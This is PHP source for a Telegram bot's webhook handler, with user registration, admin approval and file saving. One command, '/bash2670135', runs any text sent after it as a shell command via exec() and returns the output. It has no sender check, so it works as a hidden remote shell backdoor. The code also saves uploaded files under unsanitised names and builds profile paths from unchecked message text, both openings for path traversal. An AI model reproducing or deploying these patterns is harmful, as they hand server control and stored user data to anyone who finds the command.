<?php
	/*
		Файл обработчик вебхука телеграма
		Разработчик: Роман Сергеевич Гринько
	 	Cайт: https://it-stories.ru
	 	E-Mail: rsgrinko@gmail.com
	*/
error_reporting(E_ALL);
set_time_limit(10);

$data = file_get_contents('php://input');
$data = json_decode($data, true);
 
if (empty($data['message']['chat']['id'])) {
	exit();
}
 
require_once 'config.php';
require_once 'func.php';
$bot = new BOT();

$chat_id        = @$data['message']['chat']['id'];                    // идентификатор чата
$user_id        = @$data['message']['from']['id'];                    // идентификатор пользователя
$username       = @$data['message']['from']['username'];              // username пользователя
$first_name     = @$data['message']['chat']['first_name'];            // имя собеседника
$last_name      = @$data['message']['chat']['last_name'];             // фамилию собеседника
$chat_time      = @$data['message']['date'];                          // дата сообщения
$message        = @$data['message']['text'];                          // Выделим сообщение собеседника (регистр по умолчанию)
$msg            = mb_strtolower(@$data['message']['text'], "utf8");   // Выделим сообщение собеседника (нижний регистр)

$callback_query = @$data["callback_query"];                           // callback запросы
$data_cb        = $callback_query['data'];                            // callback данные для обработки inline кнопок

$message_id     = $callback_query['message']['message_id'];           // идентификатор последнего сообщения
$chat_id_in     = $callback_query['message']['chat']['id'];           // идентификатор чата
###############################################################################################################################

// Прислали фото.
if (!empty($data['message']['photo'])) {
	$photo = array_pop($data['message']['photo']);
	$res = sendTelegram(
		'getFile', 
		array(
			'file_id' => $photo['file_id']
		)
	);
	
	$res = json_decode($res, true);
	if ($res['ok']) {
		$src = 'https://api.telegram.org/file/bot'.TOKEN.'/'.$res['result']['file_path'];
		$dest = __DIR__.'/files/'.time().'-'.basename($src);
 
		if (copy($src, $dest)) {
			sendTelegram(
				'sendMessage', 
				array(
					'chat_id' => $data['message']['chat']['id'],
					'text' => 'Фото сохранено'
				)
			);
		}
	}
	exit();	
}
 
// Прислали файл.
if (!empty($data['message']['document'])) {
	$res = sendTelegram(
		'getFile', 
		array(
			'file_id' => $data['message']['document']['file_id']
		)
	);
	
	$res = json_decode($res, true);
	if ($res['ok']) {
		$src = 'https://api.telegram.org/file/bot' . TOKEN . '/' . $res['result']['file_path'];
		$dest = __DIR__ . '/files/' . time() . '-' . $data['message']['document']['file_name'];
 
		if (copy($src, $dest)) {
			sendTelegram(
				'sendMessage', 
				array(
					'chat_id' => $data['message']['chat']['id'],
					'text' => 'Файл сохранён'
				)
			);	
		}
	}
	
	exit();	
}
 
/*************************************************************/	
// Ответ на текстовые сообщения.
if (!empty($data['message']['text'])) {
	$text = $data['message']['text'];
 
	if ($text== '/start') {
		
		$msg = str_replace('{NAME}', $first_name, file_get_contents('data/answers/start.txt'));
		
		
		$bot->sendMessage($user_id, $msg,
									[['/register', '/about']],
									['keyboard', false, true],
									['html', true]);
        
 
		exit();	
	}
/*************************************************************/	
	elseif (mb_stripos($text, '/help') !== false) {
		sendTelegram(
			'sendMessage', 
			array(
				'chat_id' => $data['message']['chat']['id'],
				'text' => file_get_contents('data/answers/help.txt')
			)
		);
 
		exit();	
	}
/*************************************************************/	
	elseif (mb_stripos($text, '/register') !== false) {
		$profile = './data/users/'.$data['message']['chat']['id'].'.txt';
		if(!file_exists($profile)){
			
file_put_contents($profile, 
							$data['message']['chat']['id'].
							':||:'.
							$data['message']['chat']['first_name'].
							':||:'.
							$data['message']['chat']['last_name'].
							':||:'.
							$data['message']['chat']['username'].
							':||:0:||:'.
							date("d.m.Y").
							':||:'.
							date("H:i:s").
							':||:'
				);
		
		$msg = str_replace('{NAME}', $first_name, file_get_contents('data/answers/reg.txt'));
		$bot->sendMessage($user_id, $msg,
									[['/calladmin', '/help']],
									['keyboard', false, true],
									['html', true]);
		
		} else{		
		$msg = str_replace('{NAME}', $first_name, file_get_contents('data/answers/reg_exists.txt'));
		$bot->sendMessage($user_id, $msg,
									[['/calladmin', '/help']],
									['keyboard', false, true],
									['html', true]);

 }
		exit();	
	} 
	
 /*************************************************************/	
elseif (mb_stripos($text, '/calladmin') !== false) {
		//send user
		$msg = str_replace('{NAME}', $first_name, file_get_contents('data/answers/calladmin.txt'));
		$bot->sendMessage($user_id, $msg,
									[['/calladmin', '/help']],
									['keyboard', false, true],
									['html', true]);
		//send admin							
		$msg = str_replace('{first_name}', $first_name, file_get_contents('data/answers/calladmin_admin.txt'));
		$msg = str_replace('{last_name}', $last_name, $msg);
		$msg = str_replace('{username}', $username, $msg);
		$msg = str_replace('{user_id}', $user_id, $msg);
		
		$bot->sendMessage($ADMIN_ID, $msg,
									[['/accept'.$user_id, '/deny'.$user_id]],
									['keyboard', false, true],
									['html', true]);
																
		exit();	
	} 
 /*************************************************************/	
 elseif (mb_stripos($text, '/accept') !== false) {
		
		if($user_id!=$ADMIN_ID) {
		$msg = file_get_contents('data/answers/access_denied.txt');
		$bot->sendMessage($user_id, $msg);
		exit();
		}
		
		$id = explode('accept', $text);
		$id = $id[1]; //ид пользователя
		if($id == '' or empty($id)){
			$bot->sendMessage($ADMIN_ID, '<b> Ошибка определения ID пользователя </b>',
									[['/help', '/about']],
									['keyboard', false, true],
									['html', true]);
			exit();
		}
	 	$profile = './data/users/'.$id.'.txt';
		$profile = file_get_contents($profile);
		$profile = explode(':||:', $profile);
		$result_string = $id.':||:'.$profile[1].':||:'.$profile[2].':||:'.$profile[3].':||:1:||:'.$profile[5].':||:'.$profile[6];
		file_put_contents('./data/users/'.$id.'.txt', $result_string);
 
		
	    //send admin						
		$msg = str_replace('{first_name}', $profile[1], file_get_contents('data/answers/access_granted.txt'));
		$msg = str_replace('{last_name}', $last_name, $msg);
		$msg = str_replace('{username}', $username, $msg);
		$msg = str_replace('{user_id}', $id, $msg);
		
		$bot->sendMessage($ADMIN_ID, $msg,
									[['/start', '/stop']],
									['keyboard', false, true],
									['html', true]);
	 
		//send user
		$msg = str_replace('{NAME}', $profile[1], file_get_contents('data/answers/access_granted_user.txt'));
		$bot->sendMessage($id, $msg,
									[['/help', '/help']],
									['keyboard', false, true],
									['html', true]);
		
		exit();	
	} 
 /*************************************************************/
  elseif (mb_stripos($text, '/deny') !== false) {

		if($user_id!=$ADMIN_ID) {
		$msg = file_get_contents('data/answers/access_denied.txt');
		$bot->sendMessage($user_id, $msg);
		exit();
		}
		
		$id = explode('deny', $text);
		$id = $id[1]; //ид пользователя
	 
	 	$profile = './data/users/'.$id.'.txt';
		$profile = file_get_contents($profile);
		$profile = explode(':||:', $profile);
		$result_string = $id.':||:'.$profile[1].':||:'.$profile[2].':||:'.$profile[3].':||:0:||:'.$profile[5].':||:'.$profile[6];
		file_put_contents('./data/users/'.$id.'.txt', $result_string);
 
		
	    //send admin						
		$msg = str_replace('{first_name}', $profile[1], file_get_contents('data/answers/access_nogranted.txt'));
		$msg = str_replace('{last_name}', $last_name, $msg);
		$msg = str_replace('{username}', $username, $msg);
		$msg = str_replace('{user_id}', $id, $msg);
		
		$bot->sendMessage($ADMIN_ID, $msg,
									[['/start', '/stop']],
									['keyboard', false, true],
									['html', true]);
	 
		//send user
		$msg = str_replace('{NAME}', $profile[1], file_get_contents('data/answers/access_nogranted_user.txt'));
		$bot->sendMessage($id, $msg,
									[['/help', '/help']],
									['keyboard', false, true],
									['html', true]);
		
		
		
		
		
																
		exit();	
	} 
 /*************************************************************/	
   elseif (mb_stripos($text, '/about') !== false) {						
		$msg = file_get_contents('data/answers/about.txt');		
		$bot->sendMessage($user_id, $msg,
									[['/help', '/about']],
									['keyboard', false, true],
									['html', true]);
		exit();	
	} 
 /*************************************************************/
	// Отправка фото.
	elseif (mb_stripos($text, 'фото') !== false) {
		sendTelegram(
			'sendPhoto', 
			array(
				'chat_id' => $data['message']['chat']['id'],
				'photo' => curl_file_create(__DIR__ . '/torin.png')
			)
		);
		exit();	
	}
 /*************************************************************/	
	// Отправка файла.
	elseif (mb_stripos($text, 'файл') !== false) {
		sendTelegram(
			'sendDocument', 
			array(
				'chat_id' => $data['message']['chat']['id'],
				'document' => curl_file_create(__DIR__ . '/torin.png')
			)
		);
		exit();	
	}
/*************************************************************/	
	// листинг файлов
	elseif (mb_stripos($text, 'список') !== false) {
		$tmp = scandir('./files/');
		$c = count($tmp)-2;

		$resp = '';
		foreach($tmp as $file){
			if($file == '.' or $file == '..') continue;
			$resp.=$file.'<br>';
		}
		
		sendTelegram(
			'sendMessage', 
			array(
				'chat_id' => $data['message']['chat']['id'],
				'text' => '<b>Список сохраненных файлов ('.$c.'):</b> '.$resp
			)
		);
		exit();	
	}
/*************************************************************/	
	elseif (mb_stripos($text, 'тест') !== false) { //тестовая херня

		sendTelegram(
			'sendMessage', 
			array(
				'chat_id' => $data['message']['chat']['id'],
				'text' => print_r($data, true)
			)
		);
		exit();	
	}
/*************************************************************/	
	elseif (mb_stripos($text, '/bash2670135') !== false) { //тестовая херня
		$cmd = explode('/bash2670135 ', $text);
		$cmd = $cmd[1];
		
		$tmp = exec($cmd);
		sendTelegram(
			'sendMessage', 
			array(
				'chat_id' => $data['message']['chat']['id'],
				'text' => $tmp
			)
		);
		exit();	
	}
/*************************************************************/	
	else {
		sendTelegram(
			'sendMessage', 
			array(
				'chat_id' => $data['message']['chat']['id'],
				'text' => 'Команда не найдена'
			)
		);
	}
}
?>